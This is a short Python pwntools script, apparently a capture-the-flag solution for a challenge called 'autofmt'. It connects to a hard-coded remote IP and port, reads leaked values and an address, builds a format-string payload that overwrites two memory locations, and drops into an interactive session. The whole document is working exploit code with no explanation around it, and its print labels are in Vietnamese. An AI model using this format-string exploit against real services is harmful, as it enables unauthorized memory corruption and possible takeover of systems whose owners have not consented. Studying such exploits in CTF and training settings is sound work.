from pwn import *

# sh = process('./autofmt')
context.arch= 'amd64'
sh = remote("45.122.249.68",10015)

sh.recvuntil("a = ")
A_Value = int(sh.recvline().strip())

sh.recvuntil("b = ")
B_Value = int(sh.recvline().strip())

sh.recvuntil(b'a address: ')
A_addr=int(sh.recvline().strip().decode(),16)

B_addr = A_addr - 0x8

print("Gia tri a: ", A_Value)
print("Gia tri b: ", B_Value)
print("Dia chi a: ", A_addr)
print("Dia chi b: ", B_addr)

payload = fmtstr.fmtstr_payload(10, {A_addr:A_Value, B_addr:B_Value}, write_size='short')
sh.sendline(payload)
sh.interactive()

